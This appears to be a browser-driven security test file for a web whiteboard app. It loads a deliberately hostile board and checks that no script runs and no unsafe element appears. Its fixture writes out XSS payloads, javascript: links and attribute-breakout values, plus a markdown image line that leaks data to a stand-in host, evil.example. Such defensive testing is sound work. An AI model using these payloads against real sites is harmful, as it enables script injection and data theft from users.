// A hostile board (as ?doc= may load from anywhere): markup and script in
// every field, numbers that are strings, colors that are CSS, links that are
// javascript:.  Shown, edited, printed and exported: nothing runs, and no
// element the document did not ask for appears.  Serve web/dist first
// (python3 web/serve.py 8765), then
//   node web/board/test-xss.mjs
import { spawn } from "node:child_process";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const base = process.env.SB_URL ?? "http://127.0.0.1:8765/";
const port = 9456, sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const profile = mkdtempSync(join(tmpdir(), "sb-xss-prof-"));
const chrome = spawn(process.env.CHROME ?? "chromium", ["--headless", "--no-sandbox", `--remote-debugging-port=${port}`, "--window-size=1280,800", `--user-data-dir=${profile}`, "about:blank"], { stdio: "ignore" });
let targets;
for (let i = 0; i < 300; i++) { try { targets = await (await fetch(`http://127.0.0.1:${port}/json`)).json(); break; } catch { await sleep(100); } }
const ws = new WebSocket(targets.find((t) => t.type === "page").webSocketDebuggerUrl);
await new Promise((r) => (ws.onopen = r));
let n = 0; const waiting = new Map(); const dialogs = [];
ws.onmessage = (ev) => {
  const m = JSON.parse(ev.data);
  if (m.id && waiting.has(m.id)) { waiting.get(m.id)(m.result ?? m.error); waiting.delete(m.id); }
  if (m.method === "Page.javascriptDialogOpening") { dialogs.push(m.params.message); send("Page.handleJavaScriptDialog", { accept: true }); }
};
const send = (method, params = {}) => new Promise((r) => { const id = ++n; waiting.set(id, r); ws.send(JSON.stringify({ id, method, params })); });
const ev = async (expression) => { const r = await send("Runtime.evaluate", { expression, awaitPromise: true, returnByValue: true }); if (r.exceptionDetails) throw new Error(JSON.stringify(r.exceptionDetails).slice(0, 400)); return r.result.value; };
const fails = [];
let checks = 0;
const check = (ok, what) => { checks++; if (!ok) fails.push(what); };
const X = (k) => `<img src=x onerror="window.__xss.push('${k}')"><script>window.__xss.push('${k}s')</script><svg onload="window.__xss.push('${k}v')">`;
const hostile = {
  title: X("title"), intro: X("intro") + " [l](javascript:window.__xss.push('introlink'))", refBase: "javascript:window.__xss.push('refbase')//",
  nodes: [
    { id: "a", title: X("a-title"), text: X("a-text") + " <a href='javascript:window.__xss.push(1)'>x</a>", detail: X("a-detail"), ref: "javascript:window.__xss.push('ref')", color: "red;background:url(javascript:window.__xss.push('css'))", shape: "rect\" onmouseover=\"window.__xss.push('shape')", x: "1\"><img src=x onerror=\"window.__xss.push('x')\">", y: 0 },
    { id: "g", kind: "group", title: X("g"), text: X("g-text"), color: "url(javascript:1)", x: "0\"/><image href=x onerror=\"window.__xss.push('gx')\"/><rect x=\"0", y: 300, children: [{ id: "b", text: "**fine** <span style=\"color:green\">green</span>", w: "300\"><img src=x onerror=\"window.__xss.push('w')\">" }] },
    { id: "c", kind: "code", code: "print('<img src=x onerror=1>')\nfrom IPython.display import HTML, Markdown, display\ndisplay(HTML('<b>bold</b><img src=x onerror=\"window.__xss.push(\\'html\\')\"><script>window.__xss.push(\\'htmls\\')</script>'))\ndisplay(Markdown('![leak](https://evil.example/?data=secret) <img src=x onerror=\"window.__xss.push(\\'md\\')\">'))" },
  ],
  edges: [{ from: "a", to: "b", label: X("edge") }, { from: "b", to: "c", label: "</text><script>window.__xss.push('svg')</script>" }],
  steps: [{ focus: "a", say: X("step") }],
  tools: ["note", "<img src=x onerror=1>"],
};
try {
  for (const m of ["Page.enable", "Runtime.enable"]) await send(m);
  await send("Page.addScriptToEvaluateOnNewDocument", { source: "window.__xss = [];" });
  await send("Page.navigate", { url: `${base}board/?mermaid=${encodeURIComponent("flowchart LR\n a --> b")}` });
  for (let i = 0; i < 300 && !(await ev("!!window.sagebrush?.board?.snapshot().items.length").catch(() => false)); i++) await sleep(100);
  await ev(`window.sagebrush.board.load(${JSON.stringify(hostile)})`);
  await sleep(1500);
  await ev("window.board.focus(undefined, true)");
  await sleep(800);
  // (code ran: its outputs shown in their item)
  for (let i = 0; i < 200 && !(await ev("window.sagebrush.board.outputs().then((o) => o.some((x) => x.id === 'c' && x.state === '' && x.output))")); i++) await sleep(100);
  await ev("window.board.focus(['c'], true)");
  await sleep(800);
  await ev("window.sagebrush.board.editing(true)");
  await ev("window.sagebrush.board.step(0)");
  await sleep(600);
  await ev("window.sagebrush.board.print({ dialog: false })");
  await sleep(800);
  const html = await ev("window.sagebrush.board.exportHtml()");
  check(typeof html === "string" && html.length > 1000, "the board exports");
  // nothing ran
  check(!dialogs.length, `dialogs: ${dialogs.join(", ")}`);
  const ran = await ev("window.__xss");
  check(ran.length === 0, `script ran: ${JSON.stringify(ran)}`);
  // no element with a handler, no script, no javascript: link, no remote image from code
  const found = await ev(`(() => {
    const bad = [];
    for (const el of document.querySelectorAll("*")) {
      for (const a of el.attributes) if (/^on/i.test(a.name)) bad.push(el.tagName + "[" + a.name + "]");
      if ((el.tagName === "A" || el.tagName === "a") && /^\\s*javascript:/i.test(el.getAttribute("href") ?? "")) bad.push("a[href=javascript]");
      if (el.tagName === "SCRIPT" && !el.src && !/sagebrush|board/.test(el.textContent.slice(0, 200)) && el.closest(".board, #board-print, .board-item")) bad.push("inline script");
      if (el.tagName === "IMG" && /evil\\.example/.test(el.getAttribute("src") ?? "")) bad.push("remote image from code");
    }
    return bad;
  })()`);
  check(found.length === 0, `elements: ${found.join(", ")}`);
  // (the document as kept: only data)
  const d = await ev("window.sagebrush.board.snapshot().doc");
  check(d.nodes[0].x === undefined && d.nodes[0].color === undefined && d.nodes[0].shape === undefined, `hostile fields kept: ${JSON.stringify({ x: d.nodes[0].x, color: d.nodes[0].color, shape: d.nodes[0].shape })}`);
  check(await ev("document.querySelectorAll('.board-item span[style]').length") >= 1, "the safe formatting (a colored span) is kept");
  // the site's own pages run under their Content-Security-Policy without a single violation
  for (const [path, ready] of [["", "window.sagebrush?.kernel?.ready"], ["board/?doc=examples%2Flive.json", "window.sagebrush?.board?.outputs?.().then((o) => o.length && o.every((x) => x.state === '' ))"], ["embed/", "document.querySelectorAll('.sbnb .cell').length > 0"]]) {
    await send("Page.addScriptToEvaluateOnNewDocument", { source: "window.__csp = []; document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI));" });
    await send("Page.navigate", { url: base + path });
    for (let i = 0; i < 400 && !(await ev(ready).catch(() => false)); i++) await sleep(100);
    await sleep(1500);
    const csp = await ev("fetch(location.href).then((r) => r.headers.get('content-security-policy'))");
    check(!!csp, `/${path} has a Content-Security-Policy`);
    const v = await ev("window.__csp");
    check(v.length === 0, `/${path}: CSP violations: ${v.join(", ")}`);
  }
} catch (e) {
  fails.push(String(e?.stack ?? e));
} finally {
  chrome.kill();
  await sleep(200);
  rmSync(profile, { recursive: true, force: true });
}
console.log(`${checks - fails.length}/${checks} checks passed`);
for (const f of fails) console.log("FAIL", f);
process.exit(fails.length ? 1 : 0);
